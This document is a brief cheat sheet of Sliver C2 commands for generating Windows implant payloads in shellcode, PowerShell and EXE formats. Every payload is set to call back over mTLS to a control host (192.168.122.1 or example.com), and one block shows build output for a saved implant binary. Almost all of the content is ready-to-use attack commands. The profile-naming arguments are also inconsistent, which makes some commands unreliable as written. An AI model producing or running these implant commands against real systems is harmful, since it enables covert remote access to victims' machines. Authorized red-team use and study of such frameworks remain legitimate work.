# Payload Generation on Sliver for Windows

Here are some  commands for generating payloads on Sliver, specifically targeting Windows.

## Generating a Windows Shellcode Payload with sliver
Create a new profile called `win-shellcode` that uses mutual TLS and connects to the server IP **192.168.122.1** in **shellcode** format.
```bash
sliver > profiles new --mtls 192.168.122.1 --format shellcode win-shellcode my_profile
sliver > generate --profile my_profile
```
## Generating a Windows PowerShell Payload with sliver
Create a new profile called `win-powershell`, generating a payload in PowerShell format for Windows. 
```bash
sliver > profiles new --mtls 192.168.122.1 --format powershell win-powershell my_profile
sliver > generate --profile my_profile
```

## Generating a Windows x86 Payload with sliver
Create a new profile called `win-exe-x86`, generating a payload in EXE format for Windows x86.
```bash
sliver > profiles new --mtls 192.168.122.1 --format exe win-exe-x86 --arch x86 my_profile
sliver > generate --profile my_profile
```

## Generation a Windows Payload with generate command in sliver
The following command generates a Sliver implant for a Windows target using mTLS for secure communication. The payload is saved as an executable (`.exe`) file on the specified directory, ready to be deployed on a 64-bit Windows system.

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os windows --arch x64

[*] Generating new windows/x64 Sliver binary
[*] Build completed in 00:00:08
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY.exe
```
